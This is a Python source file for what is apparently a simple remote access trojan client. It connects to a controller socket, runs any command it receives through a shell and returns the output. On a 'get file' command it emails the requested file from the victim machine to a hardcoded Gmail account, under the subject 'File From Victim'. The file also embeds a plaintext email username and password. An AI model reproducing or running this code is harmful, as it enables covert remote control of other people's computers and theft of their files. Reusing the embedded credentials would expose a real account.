import os
import socket
import subprocess
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.utils import formatdate


def attachment_email(path):
    file = path
    username = 'yehonatanavi21@gmail.com'
    password = 'yehonatan123'
    send_from = 'yehonatanavi21@gmail.com'
    send_to = send_from
    Cc = 'recipient'
    msg = MIMEMultipart()
    msg['From'] = send_from
    msg['To'] = send_to
    msg['Cc'] = Cc
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = 'File From Victim'
    server = smtplib.SMTP('smtp.gmail.com')
    port = '587'
    fp = open(file, 'rb')
    part = MIMEBase('application', 'vnd.ms-excel')
    part.set_payload(fp.read())
    fp.close()
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment', filename='Name File Here')
    msg.attach(part)
    smtp = smtplib.SMTP('smtp.gmail.com')
    smtp.ehlo()
    smtp.starttls()
    smtp.login(username, password)
    smtp.sendmail(send_from, send_to.split(',') + msg['Cc'].split(','), msg.as_string())
    smtp.quit()


def files_list(path):
    try:
        files = os.listdir(path)

        for file in files:
            if os.path.isdir(path + "\\" + file):
                files_list(path + "\\" + file)
            else:
                print(file)
    except Exception:
        print(path)
        return path


def file_size(path):
    return os.path.getsize(path)


def client():
    s = socket.socket()
    s.connect(('127.0.0.1', 8965))

    # message = input('-> ')
    while True:
        data = s.recv(1024).decode('utf-8')
        if 'cmd' in data:
            try:
                data = data.replace('cmd ', '')
                s.send(subprocess.check_output(data, shell=True))


            except Exception:
                s.send(f"Error with {data} command".encode('utf-8'))

        elif 'get file' in data:
            data = data.replace('get file ', '')
            attachment_email(data)

        else:
            s.send('The command was not found'.encode('utf-8'))

    s.close()


if __name__ == '__main__':
    client()
